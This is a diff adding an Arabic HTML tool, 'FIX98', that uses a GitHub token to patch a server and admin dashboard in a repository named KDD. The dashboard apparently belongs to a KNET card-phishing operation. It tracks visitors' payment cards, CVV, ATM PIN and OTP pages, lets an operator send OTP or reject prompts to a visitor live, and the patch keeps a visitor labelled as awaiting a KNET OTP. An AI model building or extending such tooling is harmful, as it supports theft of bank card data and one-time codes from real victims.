@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FIX98 — تطبيق التعديلات</title>
+<style>
+body{font-family:Tahoma,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:16px}
+.wrap{max-width:860px;margin:0 auto}
+h1{font-size:19px;margin:0 0 6px}
+.sub{color:#94a3b8;font-size:13px;margin:0 0 14px}
+.card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:14px;margin-bottom:12px}
+label{display:block;font-size:12px;color:#94a3b8;margin-bottom:4px}
+input{width:100%;box-sizing:border-box;padding:9px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;font-family:monospace;font-size:13px}
+button{width:100%;padding:14px;border:0;border-radius:10px;background:#16a34a;color:#fff;font-size:17px;font-weight:bold;cursor:pointer;margin-top:10px}
+button:disabled{background:#475569}
+.row{display:flex;gap:8px;margin-top:8px}
+.row>div{flex:1}
+#log{background:#020617;border:1px solid #334155;border-radius:10px;padding:10px;font-family:monospace;font-size:12px;white-space:pre-wrap;min-height:90px;direction:ltr;text-align:left}
+.ok{color:#4ade80}.bad{color:#f87171}.info{color:#7dd3fc}.warn{color:#fbbf24}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>FIX98 — إظهار «OTP كي نت» على بطاقة العميل</h1>
+  <p class="sub">يعدّل 3 ملفات: server/index.js · server/admin/index.html · kdd-public/admin.html</p>
+  <div class="card">
+    <label>توكن GitHub (ghp_...)</label>
+    <input id="tok" placeholder="ghp_...">
+    <div class="row">
+      <div><label>المالك</label><input id="own" value="fahshomi-ui"></div>
+      <div><label>المستودع</label><input id="rep" value="KDD"></div>
+      <div><label>الفرع</label><input id="br" value="main"></div>
+    </div>
+    <button id="go">تطبيق التعديلات</button>
+  </div>
+  <div class="card"><div id="log">جاهز…</div></div>
+</div>
+<script>
+(function(){
+  var $ = function(id){ return document.getElementById(id); };
+  try { var t = localStorage.getItem('kdd_token'); if (t) $('tok').value = t; } catch(e){}
+  function log(msg, cls){
+    var el = $('log');
+    el.innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
+    el.scrollTop = el.scrollHeight;
+  }
+  var b64e = function(s){ return btoa(unescape(encodeURIComponent(s))); };
+  var b64d = function(s){ return decodeURIComponent(escape(atob(String(s).replace(/\s/g,'')))); };
+
+  var ADMIN_SCRIPT = `<script id="kddF98">
+(function(){
+  if (window.__f98) return; window.__f98 = 1;
+  var LBL = 'رمز التحقق كي نت (OTP)';
+  var lock = {};
+  function findV(id){
+    var v = null;
+    try { v = visitors.get(id); } catch(e){}
+    if (!v) { try { visitors.forEach(function(x){ if (!v && x && x._id === id) v = x; }); } catch(e){} }
+    return v || null;
+  }
+  function knetish(v){
+    if (!v) return false;
+    var p = String(v.page || '');
+    if (/كي\\s*نت|knet/i.test(p) && !/otp|رمز/i.test(p)) return true;
+    try { return (v.paymentCards || []).some(function(c){ return c && c.paymentMethod === 'KNET'; }); } catch(e){ return false; }
+  }
+  try {
+    var sp = window.shortenPage;
+    if (typeof sp === 'function' && !sp.__f98) {
+      var w = function(page){
+        var p = String(page || '').toLowerCase();
+        if (p.indexOf('otp') > -1 || p.indexOf('رمز') > -1) return '🔢 OTP كي نت';
+        return sp.call(this, page);
+      };
+      w.__f98 = 1; window.shortenPage = w; try { shortenPage = w; } catch(e){}
+    }
+  } catch(e){}
+  var oOTP = window.cardActionOTP;
+  window.cardActionOTP = function(btn, sid){
+    var v = null; try { v = visitors.get(selectedVisitorId); } catch(e){}
+    var k = knetish(v);
+    var r = (typeof oOTP === 'function') ? oOTP.apply(this, arguments) : undefined;
+    if (k && v && v._id) {
+      lock[v._id] = Date.now();
+      try { v.page = LBL; } catch(e){}
+      try { renderVisitorsList(); } catch(e){}
+      try { if (selectedVisitorId === v._id) renderVisitorDetails(v); } catch(e){}
+    }
+    return r;
+  };
+  var oREJ = window.cardActionReject;
+  window.cardActionReject = function(btn, sid){
+    var v = null; try { v = visitors.get(selectedVisitorId); } catch(e){}
+    var r = (typeof oREJ === 'function') ? oREJ.apply(this, arguments) : undefined;
+    if (v && v._id && lock[v._id]) {
+      delete lock[v._id];
+      try { v.page = 'دفع كي نت'; } catch(e){}
+      try { renderVisitorsList(); } catch(e){}
+    }
+    return r;
+  };
+  function enforce(){
+    var now = Date.now(), changed = false, selCh = false;
+    Object.keys(lock).forEach(function(id){
+      if (now - lock[id] > 1800000) { delete lock[id]; return; }
+      var v = findV(id);
+      if (!v) return;
+      var p = String(v.page || '');
+      if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(p)) { delete lock[id]; changed = true; return; }
+      if (p !== LBL) { v.page = LBL; changed = true; if (id === selectedVisitorId) selCh = true; }
+    });
+    if (changed) {
+      try { renderVisitorsList(); } catch(e){}
+      if (selCh) { try { var sv = findV(selectedVisitorId); if (sv) renderVisitorDetails(sv); } catch(e){} }
+    }
+  }
+  function hook(){
+    try {
+      var s = window.socket;
+      if (!s || s === window.__stub || !s.on || s.__f98) return;
+      s.__f98 = 1;
+      s.on('visitors:update', function(){ enforce(); });
+      s.on('visitor:pageChanged', function(){ enforce(); });
+    } catch(e){}
+  }
+  hook(); setInterval(hook, 400); setInterval(enforce, 700);
+})();
+<\/script>`;
+
+  var SERVER_REPS = [
+    {
+      f: `  socket.on("visitor:pageEnter", (page) => {
+    const visitor = __f91ResolveVisitor(socket, null);
+    if (visitor) {
+      visitor.page = page;`,
+      r: `  socket.on("visitor:pageEnter", (page) => {
+    const visitor = __f91ResolveVisitor(socket, null);
+    if (visitor) {
+      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __p98 = String(page || ''); if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(__p98)) { visitor.__f98otp = 0; } else if (/دفع|كي\\s*نت|knet|payment|otp|رمز/i.test(__p98)) { page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
+      visitor.page = page;`
+    },
+    {
+      f: `      visitor.page = data.page;
+      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;`,
+      r: `      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __q98 = String(data.page || ''); if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(__q98)) { visitor.__f98otp = 0; } else if (/دفع|كي\\s*نت|knet|payment|otp|رمز/i.test(__q98)) { data.page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
+      visitor.page = data.page;
+      visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;`
+    },
+    {
+      f: `    __f91Emit(visitorSocketId, "card:action", action);`,
+      r: `    __f91Emit(visitorSocketId, "card:action", action);
+    /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { visitorId: __v98._id, page: __v98.page }); } catch(e){} }); } } catch(e){}`
+    }
+  ];
+
+  var ADMIN_REPS = [ { f: '<\/script>\n</body>\n</html>', r: ADMIN_SCRIPT + '\n</body>\n</html>' } ];
+
+  var FILES = {
+    'server/index.js':        { marker: '/*FIX98*/', reps: SERVER_REPS },
+    'server/admin/index.html':{ marker: 'kddF98',    reps: ADMIN_REPS },
+    'kdd-public/admin.html':  { marker: 'kddF98',    reps: ADMIN_REPS }
+  };
+
+  function api(path, opt){
+    var base = 'https://api.github.com/repos/' + encodeURIComponent($('own').value.trim()) + '/' + encodeURIComponent($('rep').value.trim());
+    return fetch(base + '/contents/' + path, opt).then(function(r){
+      if (!r.ok) return r.text().then(function(t){ throw new Error(r.status + ' ' + t.slice(0,160)); });
+      return r.json();
+    });
+  }
+
+  $('go').addEventListener('click', function(){
+    var tok = $('tok').value.trim();
+    var br  = $('br').value.trim() || 'main';
+    if (!tok) { log('✗ حط التوكن أول', 'bad'); return; }
+    try { localStorage.setItem('kdd_token', tok); } catch(e){}
+    $('go').disabled = true;
+    $('log').innerHTML = '';
+    var mods = 0, fails = 0, skipped = 0;
+    var paths = Object.keys(FILES);
+
+    (function next(i){
+      if (i >= paths.length) {
+        log('—— انتهى ——', 'info');
+        log('نتيجة: ' + mods + ' معدّل · ' + skipped + ' مطبّق مسبقاً · ' + fails + ' فشل', mods ? 'ok' : 'warn');
+        $('go').disabled = false;
+        return;
+      }
+      var path = paths[i], def = FILES[path];
+      log('… قراءة ' + path, 'info');
+      var hdr = { headers: { 'Authorization': 'token ' + tok, 'Accept': 'application/vnd.github+json' } };
+      api(path + '?ref=' + encodeURIComponent(br), hdr).then(function(j){
+        var txt = b64d(j.content);
+        if (txt.indexOf(def.marker) > -1) { log('↺ ' + path + ' — مطبّق مسبقاً (تخطي)', 'warn'); skipped++; return next(i+1); }
+        var ok = true;
+        for (var k = 0; k < def.reps.length; k++) {
+          if (txt.indexOf(def.reps[k].f) === -1) { log('✗ ' + path + ' — نقطة الإدراج ' + (k+1) + ' غير موجودة', 'bad'); ok = false; break; }
+          txt = txt.replace(def.reps[k].f, def.reps[k].r);
+        }
+        if (!ok) { fails++; return next(i+1); }
+        return api(path, {
+          method: 'PUT',
+          headers: { 'Authorization': 'token ' + tok, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message: 'FIX98 — تثبيت حالة صفحة OTP كي نت', content: b64e(txt), sha: j.sha, branch: br })
+        }).then(function(){
+          log('✓ تم التعديل: ' + path, 'ok');
+          mods++;
+          next(i+1);
+        });
+      }).catch(function(e){
+        log('✗ ' + path + ' → ' + e.message, 'bad');
+        fails++;
+        next(i+1);
+      });
+    })(0);
+  });
+})();
+</script>
+</body>
+</html>
